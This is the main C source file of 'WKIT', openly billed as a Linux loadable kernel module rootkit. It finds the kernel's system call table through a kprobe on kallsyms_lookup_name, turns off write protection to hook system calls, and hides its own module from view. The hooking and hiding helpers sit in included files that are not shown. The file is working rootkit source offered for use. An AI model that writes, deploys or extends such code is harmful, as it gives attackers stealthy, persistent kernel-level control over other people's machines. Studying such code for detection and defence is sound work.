/*
 * WKIT | A LKM rootkit for modern kernels 
 * ================================================================
 * Copyright (C) 2024 ngn <F9E70878C2FB389AEC2BA34CA3654DF5AD9F641D> 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
*/

#include <linux/module.h>       
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include "lib/config.h"
#include "lib/calls.h"
#include "lib/debug.h"
#include "lib/util.h"
MODULE_LICENSE("GPL");

static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

static unsigned long* systable;
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kln;

int init_module(){
	if(!create_cfg()){
		return -1;
	}	

	register_kprobe(&kp);
	kln = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);

	if(kln == NULL){
		print("kallsysms not found");
		return -1;
	}

	print("loaded module");
	systable = kln("sys_call_table");
	print("systable is at: 0x%px", systable);

	unsetwp();
	setup_calls(systable);
	setwp();

	if(!in_debug) hideself();
	return 0;
}

void cleanup_module(){
	unsetwp();
	clean_calls(systable);
	setwp();

	clean_cfg();	
	print("unloaded module");
}
